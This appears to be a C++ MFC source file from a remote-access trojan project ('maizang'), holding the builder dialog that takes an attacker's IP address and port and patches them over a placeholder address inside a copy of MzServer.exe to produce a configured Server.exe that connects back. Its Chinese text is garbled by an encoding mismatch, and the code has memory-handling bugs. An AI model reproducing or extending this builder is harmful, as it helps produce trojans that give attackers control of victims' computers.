// SettingDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "maizang.h"
#include "SettingDlg.h"
#include "ConnectInfo.h"
#include "afxdialogex.h"


// CSettingDlg �Ի���

IMPLEMENT_DYNAMIC(CSettingDlg, CDialogEx)

CSettingDlg::CSettingDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CSettingDlg::IDD, pParent)
	, connectIp(_T(""))
	, connectPort(0)
{

}

CSettingDlg::~CSettingDlg()
{
}

void CSettingDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_IP, connectIp);
	DDX_Text(pDX, IDC_Port, connectPort);
}


BEGIN_MESSAGE_MAP(CSettingDlg, CDialogEx)
	ON_BN_CLICKED(IDC_GenerateServer, &CSettingDlg::OnBnClickedGenerateserver)
END_MESSAGE_MAP()




int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
		if (j == da) return i;   
	}   
	return -1;   
}

// CSettingDlg ��Ϣ�������

void CSettingDlg::OnBnClickedGenerateserver()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	if (GetFileAttributes("MzServer.exe")==-1)
	{
		MessageBox("�����ļ�MzServer.exe������","�Ǻ���",MB_OK|MB_ICONSTOP);
		return;
	}
	UpdateData(true);
	if(connectIp =="" || connectPort == 0){
		MessageBox("ip�Լ��˿ں����ó���","�Ǻ��գ�",MB_OK|MB_ICONSTOP);
		return;
	}	
	DeleteFile("Server.exe");
	CopyFile("MzServer.exe", "Server.exe", FALSE);
	strcpy(ConnectInfo::getConnectInfo()->ipAddress, connectIp);
	ConnectInfo::getConnectInfo()->port = connectPort;

	DWORD wr=0;
	HANDLE hFile=CreateFile("Server.exe",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	DWORD len=GetFileSize(hFile,NULL);
	char *str=new char [len];
	ZeroMemory(str,sizeof(str));
	ReadFile(hFile,str,len+1,&wr,NULL);
	CloseHandle(hFile);
	CString string = str;
	DWORD dwOffset = memfind(str,"127.000.000.001",len, 0);
	//long dwOffset = string.Find("127.0.0.1",0);
	if (dwOffset == -1)
	{
		AfxMessageBox("�ļ����Ϸ�");
		return;
	}
	CFile file;
	if(file.Open ("Server.exe", CFile::modeCreate | CFile::modeWrite))
	{
		try
		{
			file.Write(str, len);
			file.Seek(dwOffset, CFile::begin);
			ConnectInfo *p = ConnectInfo::getConnectInfo();
			file.Write(ConnectInfo::getConnectInfo(), sizeof(ConnectInfo));
			file.Close();
		}
		catch(...)
		{
			MessageBox("�ļ�����ʧ�ܣ�����","��ʾ",MB_OK|MB_ICONSTOP);
			DeleteFile("Server.exe");
			return;
		}
	}
	MessageBox("������ļ����ɳɹ�,�ѱ���ΪServer.exe","��ʾ",MB_ICONWARNING);
}

